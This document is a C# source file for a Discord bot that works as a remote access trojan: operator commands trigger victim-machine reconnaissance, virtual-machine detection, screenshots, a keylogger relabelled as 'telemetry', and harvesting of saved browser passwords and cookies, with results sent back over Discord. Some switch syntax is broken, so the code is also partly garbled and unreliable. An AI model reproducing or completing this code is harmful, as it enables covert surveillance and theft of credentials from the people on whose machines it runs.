using System;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.WebSocket;
using Microsoft.Extensions.Hosting;

namespace Bot
{
    public class DiscordBot : IHostedService
    {
        private readonly DiscordSocketClient _client = new(new DiscordSocketConfig
        {
            GatewayIntents = GatewayIntents.All
        });

        public async Task StartAsync(CancellationToken ct)
        {
            _client.Log += Log;
            _client.MessageReceived += HandleCommand;

            await _client.LoginAsync(TokenType.Bot, "YOUR_BOT_TOKEN_HERE");
            await _client.StartAsync();

            await Task.Delay(-1, ct);
        }

        public async Task StopAsync(CancellationToken ct)
        {
            await _client.StopAsync();
            await _client.DisposeAsync();
        }

        private Task Log(LogMessage msg)
        {
            Console.WriteLine(msg.ToString());
            return Task.CompletedTask;
        }

        private async Task HandleCommand(SocketMessage msg)
        {
            if (msg.Author.IsBot) return;

            var command = msg.Content.ToLowerInvariant();

            if (!command.StartsWith("!")) return;

            string response = "";

            try
            {
                response = command switch
                {
                    "!info" => System.InfoGatherer.GetSystemInfo(),
                    "!perm" => System.PrivilegeChecker.CheckElevation(),
                    "!isvm" => System.VMDetector.IsVirtualMachine() ? "YES - VM DETECTED" : "NO - PHYSICAL HARDWARE",
                    "!msgbox " + var text when !string.IsNullOrEmpty(text) => { Utils.MsgBox.Show(text); "Message shown." },
                    "!screenshot" => await Network.ScreenshotTaker.CaptureAndEncode(),
                    _ when command.StartsWith("!input-event logging and telemetry system start") => KeyLogger.StartLogging(),
                    _ when command.StartsWith("!input-event logging and telemetry system stop") => KeyLogger.StopLoggingAndDump(),
                    "!passwords" => await Browser.CredentialHarvester.ExtractPasswordsAsync(),
                    "!cookies" => await Browser.CookieExtractor.ExtractCookiesAsync(),
                    _ => "UNKNOWN COMMAND"
                };
            }
            catch (Exception ex)
            {
                response = $"ERROR: {ex.Message}";
            }

            await msg.Author.SendMessageAsync(response.Truncate(1999));
        }
    }
}
